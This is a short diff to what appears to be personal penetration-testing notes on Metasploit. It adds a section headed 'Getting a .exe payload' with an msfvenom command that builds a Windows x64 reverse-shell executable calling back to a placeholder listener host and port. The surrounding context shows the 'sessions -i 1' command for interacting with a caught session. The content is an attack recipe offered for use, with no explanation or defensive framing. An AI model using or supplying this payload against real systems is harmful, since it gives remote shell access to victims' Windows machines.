@@ -43,3 +43,8 @@ When we have a session do
 	sessions -i 1
 
 To interact with it
+
+
+### Getting a .exe payload
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<mylocalhostip> LPORT=<myserverport> -f exe -o <name_of_the_exe>
